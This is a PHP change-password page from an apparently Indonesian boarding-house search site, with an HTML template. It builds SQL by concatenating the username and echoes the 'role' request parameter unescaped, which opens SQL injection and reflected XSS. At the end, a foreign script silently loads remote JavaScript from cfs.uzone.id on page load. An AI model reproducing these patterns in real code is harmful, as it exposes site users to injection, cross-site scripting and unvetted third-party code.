<?php
// Include config file
include 'config.php';


// Initialize the session
session_start();
 
// If session variable is not set it will redirect to login page
if(!isset($_SESSION['username']) || empty($_SESSION['username'])){
  header("location: ../login.php");
  exit;
}

if(empty($_GET['role'])){ $role = '' ;} else { $role = $_GET['role']; }

$usernama = ($_SESSION['username']);

$password = $newpassword = $confirmnewpassword = $password_err = $newpassword_err = $confirmnewpassword_err = "";
	
if($_SERVER["REQUEST_METHOD"] == "POST"){ 
if(empty($_POST['role'])) {
	$role = "";
	}
	else {
	$role = $_POST['role'];
	}

if(empty(trim($_POST["password"]))){
        $password_err = "Tolong masukkan password lama.";
    } else{
		$password = trim($_POST["password"]);
        // Prepare a select statement
    
	$sql = "SELECT password FROM users WHERE username = '".$usernama."'";
        
        if($stmt = mysqli_prepare($link, $sql)){
           
            
            // Set parameters
            $param_password = $password;
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Store result
                mysqli_stmt_store_result($stmt);
                
                // Check if username exists, if yes then verify password
                if(mysqli_stmt_num_rows($stmt) == 1){                    
                    // Bind result variables
                    mysqli_stmt_bind_result($stmt, $hashed_password);
                    if(mysqli_stmt_fetch($stmt)){
                        if(password_verify($password, $hashed_password)){
                       
                        } else{
                            // Display an error message if password is not valid
                            $password_err = 'Password tidak sesuai';
                        }
                    }
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }
        }
	
    }
	
if(empty(trim($_POST['newpassword']))){
        $newpassword_err = "Tolong masukkan password baru";     
    } elseif(strlen(trim($_POST['newpassword'])) < 6){
        $newpassword_err = "Password baru harus memiliki minimal 6 karakter";
    } else{
        $newpassword = trim($_POST['newpassword']);
    }
    
    // Validate confirm password
if(empty(trim($_POST["confirmnewpassword"]))){
        $confirmnewpassword_err = 'Tolong konfirmasi password baru anda';     
    } else{
        $confirmnewpassword = trim($_POST['confirmnewpassword']);
        if($newpassword != $confirmnewpassword){
            $confirmnewpassword_err = 'Konfirmasi password baru tidak sesuai';
        }
    }
if(empty($password_err) && empty($confirmnewpassword_err) &&empty($newpassword_err)){
        
        // Prepare an insert statement
        $sql = "UPDATE users SET password=? WHERE username = '".$usernama."'";
         
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s",  $param_newpassword);
            
            // Set parameters
          
			$param_newpassword 	 = password_hash($newpassword, PASSWORD_DEFAULT);
			          
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Redirect to login page
                header('location: profil.php?user='.$usernama.'&role='.$role.'');
            } else{
                echo "Something went wrong. Please try again later.";
            }
        }
         
        // Close statement
        mysqli_stmt_close($stmt);
    }
    

}
 
?>
<!doctype html>
<html class="no-js" lang="en">
    

<head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>Sistem Informasi Pencarian Tempat Kos dan Rumah Kontrakan di Manado</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
         <!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="assets/img/home.ico">
		
		<!-- all css here -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css" type="text/css">
        <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/font-awesome.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/pe-icon-7-stroke.css" type="text/css">	
        <link rel="stylesheet" href="assets/css/animate.css" type="text/css">
		<link rel="stylesheet" href="assets/css/animate-headline.css" type="text/css">
        <link rel="stylesheet" href="assets/css/jquery-ui.css" type="text/css">
        <link rel="stylesheet" href="assets/css/meanmenu.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/bundle.css" type="text/css">
        <link rel="stylesheet" href="assets/css/style.css" type="text/css">
        <link rel="stylesheet" href="assets/css/responsive.css" type="text/css">
		<link rel="stylesheet" href="assets/css/map.css" type="text/css">	
		<link rel="stylesheet" href="lib/css/nivo-slider.css" type="text/css">
		<link rel="stylesheet" href="lib/css/preview.css" type="text/css" media="screen">
    </head>
    <body>
        <!-- header start -->
		<header class="header-area home-style-2">
			<div class="header-bottom">
			    <div class="container">
			        <div class="row">
			            <div class="col-md-4 col-sm-3 col-xs-6">
			                <div class="logo">
			                    <a href="<?php if($role == "pencari") { echo "index.php?user="; echo $usernama; echo "&role="; echo $role; } if($role == "penyedia") { echo "statuspenyedia.php?user="; echo $usernama; echo "&role="; echo $role; } ?>">
                                    <img src="assets/img/logo/rumah.png" height="40px" alt="">
                                </a>
			                </div>
			            </div>
			            <div class="col-md-8 col-sm-9 col-xs-6">
			                <div class="cart-menu">
                                
                                <div class="user user-style-3 f-right">
						            <a>
									
                                       <?php echo "Hi, ";echo $usernama; echo " anda masuk sebagai "; echo $role; 
									   $sqlz = 'SELECT * FROM users WHERE username LIKE "'.$usernama.'"';
									   $resultz = mysqli_query($link, $sqlz);
									   $rowz = mysqli_fetch_array($resultz);
									   ?> 
									   
									   <img src="../uploadfotoprofil/<?php if(empty($rowz['fotoprofil'])) { echo "default.jpg";} else { echo $rowz['fotoprofil']; }?>" height="40px" width="40px" alt="">
									   
                                    </a>
                                    <div class="currence-user-page">
                                        <div class="user-page">
                                            <ul>
                                               <li><a href="<?php echo "profil.php?user="; echo $usernama; echo "&role="; echo $role; ?>"><i class="pe-7s-user"></i> Profil</a></li>
                                               <li><a href="<?php if($role == "pencari") { echo "statuspencari.php?user="; echo $usernama; echo "&role="; echo $role; } if($role == "penyedia") { echo "statuspenyedia.php?user="; echo $usernama; echo "&role="; echo $role; } ?>"><i class="pe-7s-info"></i> Lihat Status</a></li>
											   <li><a href="<?php echo "logout.php"; ?>"><i class="pe-7s-back-2"></i> Keluar</a></li>
								
                                            </ul>
                                        </div>
                                    </div>
						        </div>		                    
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
		</header>
		<!-- header end -->
		<!-- mobile-menu-area start -->
        
        <!-- mobile-menu-area end -->
		<!-- breadcrumbs start -->
		<div class="breadcrumbs-area breadcrumb-bg ptb-100">
		    <div class="container">
		        <div class="breadcrumbs text-center">
                    <h2 class="breadcrumb-title">Profil <?php echo $usernama; ?></h2>
                    
                </div>
		    </div>
		</div>
		<!-- breadcrumbs area end -->
		<!-- login area end -->
		<div class="login-area ptb-100">
		    <div class="container">
                <div class="row">
                    <div class="col-md-6 col-md-offset-3">
                        <div class="login-content">
                            <div class="login-title">
                                <h4>Ganti Password</h4>
                                <p></p>
                            </div>
                            <div class="login-form">
                                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
									<span class="help-block">Password Lama :</span>
									<input name="password" placeholder="Password Lama" type="password" class="form-control"><span class="help-block"><?php echo $password_err; ?></span>
									<span class="help-block">Password Baru :</span>
									<input name="newpassword" placeholder="Password Baru" type="password" class="form-control"><span class="help-block"><?php echo $newpassword_err; ?></span>
                                    <span class="help-block">Konfirmasi Password Baru :</span>
									<input type="hidden" name="role" value="<?php echo $role; ?>">
									<input name="confirmnewpassword" placeholder="Konfirmasi Password Baru" type="password" class="form-control"><span class="help-block"><?php echo $confirmnewpassword_err ?></span>
                                    
									<div class="button-remember">
                                        <button class="login-btn" type="submit" >Simpan</button>
                                    </div>
                                   <div class="button-remember">
                                        <button class="login-btn" type="button" onclick="location.href='profil.php?user=<?php echo $usernama;  echo "&role="; echo $role;  ?>';">Kembali</button>
										
                                    </div>
									
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</div>
		<!-- login area end -->
		<!-- subscribe area start -->
		
		<!-- subscribe area end -->
		<!-- footer area start -->
		<footer class="footer-area">
		    <div class="container">
                <div class="footer-top pt-60 pb-30">
                  
					
                </div>
                <div class="footer-bottom ptb-20">
                    <div class="row">
					
                        <div class="col-md-7 col-sm-7">
                            <div class="copyright">
                                <p>
                                    Copyright © 2018 Angga Qurnen Suwito
                                    
                                </p>
                            </div>
                        </div>
						<div class="col-md-3 col-sm-3">
                            <div class="footer-widget mb-30">
                                <div class="footer-title">
                                    <h3>Layanan</h3>
                                </div>
                                <div class="widget-text">
                                    <ul>
                                        <li><a href="about.php" target="_blank" rel="noopener noreferrer">About</a></li>
                                        <li><a href="tutorialpencari.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Pencari</a></li>
                                        <li><a href="tutorialpenyedia.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Penyedia</a></li>
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-2 col-sm-2">
                            
							<div class="payment f-right">
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                        <li><a href="#"><i class="fa fa-pinterest-p"></i></a></li>
                                    </ul>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</footer>
		<!-- footer area end -->
		
		<!-- all js here -->
		<script src="assets/js/vendor/jquery-1.12.0.min.js" type="text/javascript"></script>
		<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.meanmenu.js" type="text/javascript"></script>
        <script src="assets/js/jquery.magnific-popup.min.js" type="text/javascript"></script>
        <script src="assets/js/isotope.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/imagesloaded.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.validate.min.js" type="text/javascript"></script>
        <script src="assets/js/owl.carousel.min.js" type="text/javascript"></script>
		<script src="lib/js/jquery.nivo.slider.js" type="text/javascript"></script>
		<script src="lib/home.js" type="text/javascript"></script>
		<script src="assets/js/plugins.js" type="text/javascript"></script>
        <script src="assets/js/main.js" type="text/javascript"></script>
		<script src="assets/js/vendor/modernizr-2.8.3.min.js" type="text/javascript"></script>
	
		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31jJGKDJMFRytkSj9I4j9ndv8I42R%2fLMgHcocdiupOeMvQ52aQnn9OdsvvFjomKd2I9VTDZPL8wYhAtzzdKiVMsr8r2CBKby5zcW6CWpYJFPKYTrwnwCYSCNT9Mi%2fQxdABzKXqsYHhuxfQ7tA4ku%2bC51m4A11K09oK8UuhW6or%2f%2fyFugzstUe3s2FXCQwUWEz11FnuMbiZSgPlDHUuLVxZKfUYGgnNW8rnicr1GHF1r8VTs6x%2bNkvGCUY8cp9oK62u0ZLukFHGY8OhMvfuf16c6ezhncjYkp5BReomV7fi2y%2fiNBapIXTjE5b%2fOdtYYqvguxNl4t7girhoc1K0Q9z%2bjLW6dcTESuvd%2fRkNs12BcwW1HTIf1D8vNbowZi5eO7IssLtpRGEQgtAl1CKLTmOfecmW3FPWs8SADIzjNNv9ztYWD5wLhD%2fd55gSiDpw9fwyApKwhzqTJalLiZJrdZD9pDHNM7xoEgfTPpJru%2bD6yTyMssyDRFpbAibzMxklSPYG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

   <?php // Close connection
    mysqli_close($link); ?>